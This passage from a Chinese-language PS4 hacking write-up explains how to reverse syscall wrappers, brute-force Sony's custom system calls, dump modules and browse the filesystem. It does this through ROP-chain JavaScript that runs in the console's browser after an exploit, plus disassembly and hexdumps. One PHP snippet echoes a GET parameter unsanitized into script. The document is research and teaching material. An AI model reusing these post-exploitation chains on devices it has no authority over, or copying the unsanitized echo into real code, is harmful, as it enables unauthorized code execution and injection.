	if&nbsp;((fd&nbsp;=&nbsp;__sys_open(_PATH_CONSOLE,&nbsp;O_RDWR))&nbsp;&lt;&nbsp;0)
		PANIC(&quot;Can&#39;t&nbsp;open&nbsp;console&quot;);
	if&nbsp;(setlogin(&quot;root&quot;)&nbsp;==&nbsp;-1)
		PANIC(&quot;Can&#39;t&nbsp;set&nbsp;login&nbsp;to&nbsp;root&quot;);
	if&nbsp;(_ioctl(fd,&nbsp;TIOCSCTTY,&nbsp;(char&nbsp;*)&nbsp;NULL)&nbsp;==&nbsp;-1)
		PANIC(&quot;Can&#39;t&nbsp;set&nbsp;controlling&nbsp;terminal&quot;);}</pre>
<p>也可以在libkernel.sprx的偏移0x215F0处找到相同的函数。这是以上从libkernel转储中提取部分：</p>
<pre>call&nbsp;&nbsp;&nbsp;&nbsp;getpid
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cs:dword_5B638,&nbsp;eax
cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;1
jnz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;loc_2169F

call&nbsp;&nbsp;&nbsp;&nbsp;setsid
cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;0FFFFFFFFh
jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;loc_21A0C

lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdi,&nbsp;aDevConsole&nbsp;;&nbsp;&quot;/dev/console&quot;
call&nbsp;&nbsp;&nbsp;&nbsp;revoke
test&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;eax
jnz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;loc_21A24

lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdi,&nbsp;aDevConsole&nbsp;;&nbsp;&quot;/dev/console&quot;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,&nbsp;2
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;al,&nbsp;al
call&nbsp;&nbsp;&nbsp;&nbsp;open

mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r14d,&nbsp;eax
test&nbsp;&nbsp;&nbsp;&nbsp;r14d,&nbsp;r14d
js&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;loc_21A3C
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdi,&nbsp;aRoot&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;&quot;root&quot;
call&nbsp;&nbsp;&nbsp;&nbsp;setlogin
cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;0FFFFFFFFh
jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;loc_21A54

mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,&nbsp;r14d
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,&nbsp;20007461h
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,&nbsp;edx
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;al,&nbsp;al
call&nbsp;&nbsp;&nbsp;&nbsp;ioctl
cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;0FFFFFFFFh
jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;loc_21A6C</pre>
<p><span style="font-size: 20px;"><strong>反转模块转储以分析系统调用</strong></span></p>
<p>libkernel不是完全开源的，还有很多自定义代码可以帮助我们来探索索尼的一些系统调用。虽然这个过程会根据你说查找的系统调用而有所不同，但对于某些人来说，简单理解被传递的参数含义还是比较容易的。。</p>
<p>系统调用调用包装器会在 libkernel.sprx 中的某处被声明，并且几乎总是按着这个模板来的：</p>
<pre>000000000000DB70&nbsp;syscall_601&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proc&nbsp;near
000000000000DB70&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rax,&nbsp;259h
000000000000DB77&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r10,&nbsp;rcx
000000000000DB7A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall
000000000000DB7C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;error
000000000000DB7E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retn
000000000000DB7F
000000000000DB7F&nbsp;error:
000000000000DB7F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,&nbsp;sub_DF60
000000000000DB86&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx
000000000000DB86&nbsp;syscall_601&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;endp</pre>
<p>mov r10, rcx 指令并不意味着系统调用至少需要 4 个参数，所有的系统调用包装器都类似，即使是那些不带参数的，例如getpid。当你找到调用包装器之后，你就可以查找它的所有交叉引用情况：</p>
<pre>0000000000011D50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,&nbsp;10h
0000000000011D55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,&nbsp;esi
0000000000011D57&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,&nbsp;1
0000000000011D5C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;syscall_601
0000000000011D61&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;eax
0000000000011D63&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;loc_11D6A</pre>
<p>最好是多查找几个，以确保寄存器没有被无关的代码修改：</p>
<pre>0000000000011A28&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,&nbsp;9
0000000000011A2D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,&nbsp;esi
0000000000011A2F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,&nbsp;edx
0000000000011A31&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;syscall_601
0000000000011A36&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;eax
0000000000011A38&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;loc_11A3F</pre>
<p>可以看出，系统调用约定（rdi，rsi和rdx）的前三个寄存器在调用之前已经被修改，所以我们可以确定它需要3个参数。</p>
<p>以下我们在JuSt-ROP中重现调用的方法：</p>
<pre>chain.syscall(&quot;unknown&quot;,&nbsp;601,&nbsp;0x10,&nbsp;0,&nbsp;1);
chain.syscall(&quot;unknown&quot;,&nbsp;601,&nbsp;9,&nbsp;0,&nbsp;0);</pre>
<p>与大多数系统调用一样，成功返回值为 0，我们可以从 test 指令之后的 jz 指令中看出。如果要进一步了解比参数更多的信息，我们就要调用其前后的代码来进行更深入的分析。</p>
<p><span style="font-size: 20px;"><strong>强制系统调用</strong></span></p>
<p>虽然反向工程模块转储是识别系统调用的最可靠的方法，但一些系统调用完全没有在转储中被引用，所以我们只能进行盲目的分析。</p>
<p>如果我们猜测某个系统调用可能需要一组特定的参数，那么我们可以强制所有的系统调用返回一个值（0为成功），并且忽略所有返回的错误。我们还可以为所有参数传递0，并强制所有系统调用返回的错误信息是有用的，例如0xe，“Bad address”，这表示它们至少需要一个指针。</p>
<p>首先，我们要在页面加载后立即执行ROP链。我们可以通过将我们的函数附加到body元素的onload来实现：</p>
<pre>&lt;body&nbsp;onload=&quot;exploit()&quot;&gt;</pre>
<p>接下来，我们将需要根据HTTP GET值来执行特定的系统调用。虽然可以使用JavaScript来完成，但我们还是要给大家演示如何使用PHP进行简单的操作：</p>
<pre>var&nbsp;Sony&nbsp;=&nbsp;533;
chain.syscall(&quot;Sony&nbsp;system&nbsp;call&quot;,&nbsp;Sony&nbsp;+&nbsp;&lt;?php&nbsp;print($_GET[&quot;b&quot;]);&nbsp;?&gt;,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0);
chain.write_rax_ToVariable(0);</pre>
<p>一旦执行了系统调用，我们就可以检查返回值，如果看不到有用的信息，我们就继续将页面重定向到下一个系统调用：</p>
<pre>if(chain.getVariable(0)&nbsp;==&nbsp;0x16)&nbsp;window.location.assign(&quot;index.php?b=&quot;&nbsp;+&nbsp;(&lt;?php&nbsp;print($_GET[&quot;b&quot;]);&nbsp;?&gt;&nbsp;+&nbsp;1).toString());</pre>
<p>在末尾附加 ?b=0 并运行页面，就可以从第一个索尼的系统调用来进行强制系统调用。虽然这种方法需要进行大量的尝试，但是通过将不同的值传递给强制系统调用，我们可以对这些返回值进行分析及识别。</p>
<p><span style="font-size: 20px;"><strong>系统调用538</strong></span></p>
<p>例如，我们在不依赖于任何模块转储的情况下，看看系统调用538。这些返回值取决于第一个参数传递的值：</p>
<pre class="brush:html;toolbar:false">0&nbsp;-&nbsp;0x16，“参数无效”
1&nbsp;-&nbsp;0xe，“坏地址”</pre>
<p>指针最初指向0s &#8211; 0x64，但每次刷新页面时，此值将增加1，其他可供尝试的参数还包括PID，线程ID和文件描述符。虽然大多数系统调用会在成功时返回0，但由于返回值具有每次调用后都会增加的特点，所以应该给它分配一个资源编号，例如文件描述符。</p>
<p>接下来要做的是在执行系统调用前后分别查看数据，看看数据是否已被写入。由于数据没有变化，我们可以假定它是现在输入的。然后，我们尝试着把传递的一个长字符串作为第一个参数。其实对于每一个输入，我们都应该如此尝试，因为有可能发现缓冲区溢出。</p>
<pre>writeString(chain.data,&nbsp;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;);
chain.syscall(&quot;unknown&quot;,&nbsp;538,&nbsp;chain.data,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0);</pre>
<p>返回值为0x3f，ENAMETOOLONG。不幸的是，这个系统调用似乎限制了名称长度（包括 NULL 结束符一共 32 字节），但是这个限制提示了我们，字符串不应该是结构体。</p>
<p>关于这个系统调用，从我们现在掌握的情况来看，最明显的是与文件系统相关的东西（如自定义mkdir或open），但是似乎这种可能性不是很大，因为在我们之前分配了一个将任何数据写入指针的资源。</p>
<p>要测试第一个参数是不是一个路径，我们可以用多个字符进行分解，以查看是否允许使用更长的字符串：</p>
<pre>writeString(chain.data,&nbsp;&quot;aaaaaaaaaa/aaaaaaaaaa/aaaaaaaaaa&quot;);
chain.syscall(&quot;unknown&quot;,&nbsp;538,&nbsp;chain.data,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0);</pre>
<p>由于返回了0x3f，我们可以假设第一个参数不是一个路径，而是一个被分配顺序标识的名称。在分析了更多的系统调用之后，我们发现以下这些都具有完全相同的行为：</p>
<pre class="brush:html;toolbar:false">533
538
557
574
580</pre>
<p>从目前的信息来看，我们几乎不可能准确地确定这些系统调用的功能，但是当我们进行过更多的测试时，许多信息就会慢慢被揭示出来。为了继续往下分析，我们要直接告诉大家，系统调用 538 是用来分配一个事件标志的，而不是接收一个名称的。运用关于内核运行的一般知识，你可以猜测并验证这些系统调用在分配的信号量、互斥锁等。</p>
<p><span style="font-size: 20px;"><strong>转储其他模块</strong></span></p>
<p>我们可以通过以下这些操作来转储其他模块：</p>
<pre class="brush:html;toolbar:false">加载模块
获取模块的基地址
转储模块</pre>
<p>要加载模块，我们需要使用libSceSysmodule.sprx + 0x1850中的sceSysmoduleLoadModule函数。第一个参数是要加载的模块编号，另外3个应该为0。</p>
<p>以下JuSt-ROP方法可用于执行函数调用：</p>
<pre>this.call&nbsp;=&nbsp;function(name,&nbsp;module,&nbsp;address,&nbsp;arg1,&nbsp;arg2,&nbsp;arg3,&nbsp;arg4,&nbsp;arg5,&nbsp;arg6)&nbsp;{
	console.log(&quot;call&nbsp;&quot;&nbsp;+&nbsp;name);
	
	if(typeof(arg1)&nbsp;!==&nbsp;&quot;undefined&quot;)&nbsp;this.add(&quot;pop&nbsp;rdi&quot;,&nbsp;arg1);
	if(typeof(arg2)&nbsp;!==&nbsp;&quot;undefined&quot;)&nbsp;this.add(&quot;pop&nbsp;rsi&quot;,&nbsp;arg2);
	if(typeof(arg3)&nbsp;!==&nbsp;&quot;undefined&quot;)&nbsp;this.add(&quot;pop&nbsp;rdx&quot;,&nbsp;arg3);
	if(typeof(arg4)&nbsp;!==&nbsp;&quot;undefined&quot;)&nbsp;this.add(&quot;pop&nbsp;rcx&quot;,&nbsp;arg4);
	if(typeof(arg5)&nbsp;!==&nbsp;&quot;undefined&quot;)&nbsp;this.add(&quot;pop&nbsp;r8&quot;,&nbsp;arg5);
	if(typeof(arg6)&nbsp;!==&nbsp;&quot;undefined&quot;)&nbsp;this.add(&quot;pop&nbsp;r9&quot;,&nbsp;arg6);
	this.add(module_bases[module]&nbsp;+&nbsp;address);
}</pre>
<p>所以，要加载libSceAvSetting.sprx（0xb）：</p>
<pre>chain.call(&quot;sceSysmoduleLoadModule&quot;,&nbsp;libSysmodule,&nbsp;0x1850,&nbsp;0xb,&nbsp;0,&nbsp;0,&nbsp;0);</pre>
<p>不幸的是，在尝试加载某些模块时会触发故障;这是因为sceSysmoduleLoadModule函数不加载依赖关系，因此我们需要先手动加载它们。</p>
<p>像大多数系统调用一样，成功时应该返回 0。要查看已分配的加载模块编号，我们可以使用索尼自定义的系统调用编号 592，来获取当前加载的模块列表：</p>
<pre>var&nbsp;countAddress&nbsp;=&nbsp;chain.data;
var&nbsp;modulesAddress&nbsp;=&nbsp;chain.data&nbsp;+&nbsp;8;

//&nbsp;System&nbsp;call&nbsp;592,&nbsp;getLoadedModules(int&nbsp;*destinationModuleHandles,&nbsp;int&nbsp;max,&nbsp;int&nbsp;*count);
chain.syscall(&quot;getLoadedModules&quot;,&nbsp;592,&nbsp;modulesAddress,&nbsp;256,&nbsp;countAddress);

chain.execute(function()&nbsp;{
	var&nbsp;count&nbsp;=&nbsp;getU64from(countAddress);
	for(var&nbsp;index&nbsp;=&nbsp;0;&nbsp;index&nbsp;&lt;&nbsp;count;&nbsp;index++)&nbsp;{
		logAdd(&quot;Module&nbsp;handle:&nbsp;0x&quot;&nbsp;+&nbsp;getU32from(modulesAddress&nbsp;+&nbsp;index&nbsp;*&nbsp;4).toString(16));
	}
});</pre>
<p>在不加载任何其他模块的情况下运行系统调用编号 592，将产生以下列表：</p>
<pre>0x0,&nbsp;0x1,&nbsp;0x2,&nbsp;0xc,&nbsp;0xe,&nbsp;0xf,&nbsp;0x11,&nbsp;0x12,&nbsp;0x13,&nbsp;0x14,&nbsp;0x15,&nbsp;0x16,&nbsp;0x17,&nbsp;0x18,&nbsp;0x19,&nbsp;0x1a,&nbsp;0x1b,&nbsp;0x1e,&nbsp;0x37,&nbsp;0x59</pre>
<p>但是，如果我们在加载模块0xb后运行它，我们将看到一个附加条目0x65。请记住，模块编号与加载的模块句柄不同。</p>
<p>我们现在可以使用另一个索尼的自定义系统调用编号593，它采用模块句柄和缓冲区，并且填充缓冲区，其中包含有关加载模块的信息，其中包括其基址。由于下一个可用句柄始终为0x65，因此我们可以将该值硬编码到我们的ROP链中，，而不是必须从模块列表中存储结果。缓冲区必须以应返回的结构体的长度开始，否则将返回 0x16 “无效参数”的错误信息：</p>
<pre>setU64to(moduleInfoAddress,&nbsp;0x160);
chain.syscall(&quot;getModuleInfo&quot;,&nbsp;593,&nbsp;0x65,&nbsp;moduleInfoAddress);

chain.execute(function()&nbsp;{
	logAdd(hexDump(moduleInfoAddress,&nbsp;0x160));
});</pre>
<p>它将在成功时返回0，并用可以读取的结构填充缓冲区：</p>
<pre>var&nbsp;name&nbsp;=&nbsp;readString(moduleInfoAddress&nbsp;+&nbsp;0x8);
var&nbsp;codeBase&nbsp;=&nbsp;getU64from(moduleInfoAddress&nbsp;+&nbsp;0x108);
var&nbsp;codeSize&nbsp;=&nbsp;getU32from(moduleInfoAddress&nbsp;+&nbsp;0x110);
var&nbsp;dataBase&nbsp;=&nbsp;getU64from(moduleInfoAddress&nbsp;+&nbsp;0x118);
var&nbsp;dataSize&nbsp;=&nbsp;getU32from(moduleInfoAddress&nbsp;+&nbsp;0x120);</pre>
<p>至此，我们就拥有转储模块所需的一切条件了。</p>
<pre>dump(codeBase,&nbsp;codeSize&nbsp;+&nbsp;dataSize);</pre>
<p>另外还有一个索尼系统调用编号608，它的工作方式与593类似，但提供了有关加载模块的其他信息：</p>
<pre>setU64to(moduleInfoAddress,&nbsp;0x1a8);
chain.syscall(&quot;getDifferentModuleInfo&quot;,&nbsp;608,&nbsp;0x65,&nbsp;0,&nbsp;moduleInfoAddress);
logAdd(hexDump(moduleInfoAddress,&nbsp;0x1a8));</pre>
<p>目前还不清楚这些信息是什么。</p>
<p><span style="font-size: 20px;"><strong>浏览文件系统</strong></span></p>
<p>PS4使用标准的FreeBSD 9.0系统调用读取文件和目录。但是，在/ dev /这类的目录中，使用读取操作是可行的，而对于其他类型的目录，读取就会失败。目前，我们还没有搞清楚其中的原因，但是如果我们使用getdents而不是读取操作，它将会更加可靠地运行：</p>
<pre>writeString(chain.data,&nbsp;&quot;/dev/&quot;);
chain.syscall(&quot;open&quot;,&nbsp;5,&nbsp;chain.data,&nbsp;0,&nbsp;0);
chain.write_rax_ToVariable(0);

chain.read_rdi_FromVariable(0);
chain.syscall(&quot;getdents&quot;,&nbsp;272,&nbsp;undefined,&nbsp;chain.data&nbsp;+&nbsp;0x10,&nbsp;1028);</pre>
<p>最终结果如下：</p>
<pre>0000010:&nbsp;0700&nbsp;0000&nbsp;1000&nbsp;0205&nbsp;6469&nbsp;7073&nbsp;7700&nbsp;0000&nbsp;&nbsp;........dipsw...
0000020:&nbsp;0800&nbsp;0000&nbsp;1000&nbsp;0204&nbsp;6e75&nbsp;6c6c&nbsp;0000&nbsp;0000&nbsp;&nbsp;........null....
0000030:&nbsp;0900&nbsp;0000&nbsp;1000&nbsp;0204&nbsp;7a65&nbsp;726f&nbsp;0000&nbsp;0000&nbsp;&nbsp;........zero....
0000040:&nbsp;0301&nbsp;0000&nbsp;0c00&nbsp;0402&nbsp;6664&nbsp;0000&nbsp;0b00&nbsp;0000&nbsp;&nbsp;........fd......
0000050:&nbsp;1000&nbsp;0a05&nbsp;7374&nbsp;6469&nbsp;6e00&nbsp;0000&nbsp;0d00&nbsp;0000&nbsp;&nbsp;....stdin.......
0000060:&nbsp;1000&nbsp;0a06&nbsp;7374&nbsp;646f&nbsp;7574&nbsp;0000&nbsp;0f00&nbsp;0000&nbsp;&nbsp;....stdout......
0000070:&nbsp;1000&nbsp;0a06&nbsp;7374&nbsp;6465&nbsp;7272&nbsp;0000&nbsp;1000&nbsp;0000&nbsp;&nbsp;....stderr......
0000080:&nbsp;1000&nbsp;0205&nbsp;646d&nbsp;656d&nbsp;3000&nbsp;0000&nbsp;1100&nbsp;0000&nbsp;&nbsp;....dmem0.......
0000090:&nbsp;1000&nbsp;0205&nbsp;646d&nbsp;656d&nbsp;3100&nbsp;0000&nbsp;1300&nbsp;0000&nbsp;&nbsp;....dmem1.......
00000a0:&nbsp;1000&nbsp;0206&nbsp;7261&nbsp;6e64&nbsp;6f6d&nbsp;0000&nbsp;1400&nbsp;0000&nbsp;&nbsp;....random......
00000b0:&nbsp;1000&nbsp;0a07&nbsp;7572&nbsp;616e&nbsp;646f&nbsp;6d00&nbsp;1600&nbsp;0000&nbsp;&nbsp;....urandom.....
00000c0:&nbsp;1400&nbsp;020b&nbsp;6465&nbsp;6369&nbsp;5f73&nbsp;7464&nbsp;6f75&nbsp;7400&nbsp;&nbsp;....deci_stdout.
00000d0:&nbsp;1700&nbsp;0000&nbsp;1400&nbsp;020b&nbsp;6465&nbsp;6369&nbsp;5f73&nbsp;7464&nbsp;&nbsp;........deci_std
00000e0:&nbsp;6572&nbsp;7200&nbsp;1800&nbsp;0000&nbsp;1400&nbsp;0209&nbsp;6465&nbsp;6369&nbsp;&nbsp;err.........deci
00000f0:&nbsp;5f74&nbsp;7479&nbsp;3200&nbsp;0000&nbsp;1900&nbsp;0000&nbsp;1400&nbsp;0209&nbsp;&nbsp;_tty2...........
0000100:&nbsp;6465&nbsp;6369&nbsp;5f74&nbsp;7479&nbsp;3300&nbsp;0000&nbsp;1a00&nbsp;0000&nbsp;&nbsp;deci_tty3.......
0000110:&nbsp;1400&nbsp;0209&nbsp;6465&nbsp;6369&nbsp;5f74&nbsp;7479&nbsp;3400&nbsp;0000&nbsp;&nbsp;....deci_tty4...
0000120:&nbsp;1b00&nbsp;0000&nbsp;1400&nbsp;0209&nbsp;6465&nbsp;6369&nbsp;5f74&nbsp;7479&nbsp;&nbsp;........deci_tty
0000130:&nbsp;3500&nbsp;0000&nbsp;1c00&nbsp;0000&nbsp;1400&nbsp;0209&nbsp;6465&nbsp;6369&nbsp;&nbsp;5...........deci
0000140:&nbsp;5f74&nbsp;7479&nbsp;3600&nbsp;0000&nbsp;1d00&nbsp;0000&nbsp;1400&nbsp;0209&nbsp;&nbsp;_tty6...........
0000150:&nbsp;6465&nbsp;6369&nbsp;5f74&nbsp;7479&nbsp;3700&nbsp;0000&nbsp;1e00&nbsp;0000&nbsp;&nbsp;deci_tty7.......
0000160:&nbsp;1400&nbsp;020a&nbsp;6465&nbsp;6369&nbsp;5f74&nbsp;7479&nbsp;6130&nbsp;0000&nbsp;&nbsp;....deci_ttya0..
0000170:&nbsp;1f00&nbsp;0000&nbsp;1400&nbsp;020a&nbsp;6465&nbsp;6369&nbsp;5f74&nbsp;7479&nbsp;&nbsp;........deci_tty
0000180:&nbsp;6230&nbsp;0000&nbsp;2000&nbsp;0000&nbsp;1400&nbsp;020a&nbsp;6465&nbsp;6369&nbsp;&nbsp;b0..&nbsp;.......deci
0000190:&nbsp;5f74&nbsp;7479&nbsp;6330&nbsp;0000&nbsp;2200&nbsp;0000&nbsp;1400&nbsp;020a&nbsp;&nbsp;_ttyc0..&quot;.......
00001a0:&nbsp;6465&nbsp;6369&nbsp;5f73&nbsp;7464&nbsp;696e&nbsp;0000&nbsp;2300&nbsp;0000&nbsp;&nbsp;deci_stdin..#...
00001b0:&nbsp;0c00&nbsp;0203&nbsp;6270&nbsp;6600&nbsp;2400&nbsp;0000&nbsp;1000&nbsp;0a04&nbsp;&nbsp;....bpf.$.......
00001c0:&nbsp;6270&nbsp;6630&nbsp;0000&nbsp;0000&nbsp;2900&nbsp;0000&nbsp;0c00&nbsp;0203&nbsp;&nbsp;bpf0....).......
00001d0:&nbsp;6869&nbsp;6400&nbsp;2c00&nbsp;0000&nbsp;1400&nbsp;0208&nbsp;7363&nbsp;655f&nbsp;&nbsp;hid.,.......sce_
00001e0:&nbsp;7a6c&nbsp;6962&nbsp;0000&nbsp;0000&nbsp;2e00&nbsp;0000&nbsp;1000&nbsp;0204&nbsp;&nbsp;zlib............
00001f0:&nbsp;6374&nbsp;7479&nbsp;0000&nbsp;0000&nbsp;3400&nbsp;0000&nbsp;0c00&nbsp;0202&nbsp;&nbsp;ctty....4.......
0000200:&nbsp;6763&nbsp;0000&nbsp;3900&nbsp;0000&nbsp;0c00&nbsp;0203&nbsp;6463&nbsp;6500&nbsp;&nbsp;gc..9.......dce.
0000210:&nbsp;3a00&nbsp;0000&nbsp;1000&nbsp;0205&nbsp;6462&nbsp;6767&nbsp;6300&nbsp;0000&nbsp;&nbsp;:.......dbggc...
0000220:&nbsp;3e00&nbsp;0000&nbsp;0c00&nbsp;0203&nbsp;616a&nbsp;6d00&nbsp;4100&nbsp;0000&nbsp;&nbsp;&gt;.......ajm.A...
0000230:&nbsp;0c00&nbsp;0203&nbsp;7576&nbsp;6400&nbsp;4200&nbsp;0000&nbsp;0c00&nbsp;0203&nbsp;&nbsp;....uvd.B.......
0000240:&nbsp;7663&nbsp;6500&nbsp;4500&nbsp;0000&nbsp;1800&nbsp;020d&nbsp;6e6f&nbsp;7469&nbsp;&nbsp;vce.E.......noti
0000250:&nbsp;6669&nbsp;6361&nbsp;7469&nbsp;6f6e&nbsp;3000&nbsp;0000&nbsp;4600&nbsp;0000&nbsp;&nbsp;fication0...F...
0000260:&nbsp;1800&nbsp;020d&nbsp;6e6f&nbsp;7469&nbsp;6669&nbsp;6361&nbsp;7469&nbsp;6f6e&nbsp;&nbsp;....notification
0000270:&nbsp;3100&nbsp;0000&nbsp;5000&nbsp;0000&nbsp;1000&nbsp;0206&nbsp;7573&nbsp;6263&nbsp;&nbsp;1...P.......usbc
0000280:&nbsp;746c&nbsp;0000&nbsp;5600&nbsp;0000&nbsp;1000&nbsp;0206&nbsp;6361&nbsp;6d65&nbsp;&nbsp;tl..V.......came
0000290:&nbsp;7261&nbsp;0000&nbsp;8500&nbsp;0000&nbsp;0c00&nbsp;0203&nbsp;726e&nbsp;6700&nbsp;&nbsp;ra..........rng.
00002a0:&nbsp;0701&nbsp;0000&nbsp;0c00&nbsp;0403&nbsp;7573&nbsp;6200&nbsp;c900&nbsp;0000&nbsp;&nbsp;........usb.....
00002b0:&nbsp;1000&nbsp;0a07&nbsp;7567&nbsp;656e&nbsp;302e&nbsp;3400&nbsp;0000&nbsp;0000&nbsp;&nbsp;....ugen0.4.....
00002c0:&nbsp;0000&nbsp;0000&nbsp;0000&nbsp;0000&nbsp;0000&nbsp;0000&nbsp;0000&nbsp;0000&nbsp;&nbsp;................</pre>
<p>你可以读取其中的一些设备，例如：读取 /dev/urandom将使用随机数据填充内存。解析这段内存并且创建一个干净的条目列表也是有可能的；例如完整的文件也可以解析这个内存来创建干净的条目列表;看看在浏览器中的browser.html完整的文件浏览器：</p>
<p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170325/1490410118552996.png" title="1490410118552996.png" alt="1490410118552996.png" width="660" height="363" border="0" vspace="0" style="width: 660px; height: 363px;"/><noscript><img src="/uploads/20170325/1490410118552996.png" title="1490410118552996.png" alt="1490410118552996.png" width="660" height="363" border="0" vspace="0" style="width: 660px; height: 363px;"/></noscript></p>
